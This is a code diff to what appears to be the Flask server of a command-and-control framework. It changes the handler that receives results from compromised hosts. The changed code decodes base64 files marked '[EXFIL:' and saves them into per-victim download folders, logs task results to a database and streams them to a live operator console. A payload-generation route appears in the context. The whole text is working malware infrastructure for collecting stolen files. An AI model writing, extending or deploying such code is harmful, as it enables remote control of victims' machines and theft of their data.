@@ -229,26 +229,39 @@ def result():
     command = data.get("command")
     result = data.get("result")
 
-    if result.startswith("[EXFIL:"):
-        lines = result.splitlines()
-        header = lines[0]
-        b64data = "\n".join(lines[1:])
-        filepath = header.split(":", 1)[1].strip().rstrip("]")
-        filename = os.path.basename(filepath)
-        decoded = base64.b64decode(b64data)
-        outdir = os.path.join("downloads", hostname)
-        os.makedirs(outdir, exist_ok=True)
-        full_path = os.path.join(outdir, filename)
-        with open(full_path, "wb") as f:
-            f.write(decoded)
-        print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
+    # If result is a dict (e.g., from scan task), stringify it for storage/logging
+    if isinstance(result, dict):
+        result = json.dumps(result, indent=2)
 
+    # Handle exfil results
+    if isinstance(result, str) and result.startswith("[EXFIL:"):
+        try:
+            lines = result.splitlines()
+            header = lines[0]
+            b64data = "\n".join(lines[1:])
+            filepath = header.split(":", 1)[1].strip().rstrip("]")
+            filename = os.path.basename(filepath)
+            decoded = base64.b64decode(b64data)
+            outdir = os.path.join("downloads", hostname)
+            os.makedirs(outdir, exist_ok=True)
+            full_path = os.path.join(outdir, filename)
+            with open(full_path, "wb") as f:
+                f.write(decoded)
+            print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
+        except Exception as ex:
+            print(f"[!] Failed to process exfil file: {ex}")
+
+    # Store result in database
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
+    c.execute(
+        "UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'",
+        (result, hostname, command)
+    )
     conn.commit()
     conn.close()
 
+    # Emit result to live console view
     socketio.emit("console_result", {
         "hostname": hostname,
         "command": command,
@@ -256,6 +269,7 @@ def result():
     })
 
     return jsonify({"status": "result stored"})
+
 
 @app.route('/generate', methods=['GET', 'POST'])
 @login_required
